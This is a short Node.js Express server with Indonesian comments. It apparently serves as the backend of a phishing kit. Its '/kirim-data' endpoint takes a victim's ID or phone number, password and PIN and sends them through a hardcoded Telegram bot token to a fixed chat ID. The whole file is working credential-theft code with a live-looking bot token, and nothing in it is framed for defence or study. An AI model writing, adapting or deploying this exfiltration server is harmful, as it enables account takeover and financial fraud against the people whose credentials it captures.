require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');

const app = express();
const PORT = 3000;

// ✅ TOKEN & CHAT_ID kamu tetap di sini — jangan diubah
const BOT_TOKEN = "8639273694:AAGcHEUSVDGCmhMP3hzm7cikK9LqnKjqH_I";
const CHAT_ID = "8810674043";

app.use(express.static('.'));
app.use(bodyParser.json());

// 👇 GANTI SELURUH BAGIAN INI SAJA 👇
app.post('/kirim-data', (req, res) => {
  const { langkah, id, sandi, pin } = req.body;

  let isiPesan = `✅ ${langkah}\n━━━━━━━━━━━━━━━\n📱 Nomor/ID: ${id}\n🔑 Kata Sandi: ${sandi}`;
  if (pin) isiPesan += `\n🔢 PIN: ${pin}`;
  isiPesan += `\n━━━━━━━━━━━━━━━`;

  const pesan = encodeURIComponent(isiPesan);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;

  console.log('📤 Mengirim ke Telegram...');
  console.log('URL:', url);

  https.get(url, (resp) => {
    let data = '';
    resp.on('data', chunk => data += chunk);
    resp.on('end', () => {
      console.log('📥 Respon Telegram:', data);
      res.json({ sukses: true, respon: data });
    });
  }).on('error', (err) => {
    console.error('❌ Error:', err.message);
    res.status(500).json({ sukses: false, error: err.message });
  });
});
// 👆 Sampai sini saja 👆

app.listen(PORT, () => {
  console.log(`✅ Server berjalan di http://localhost:${PORT}`);
});
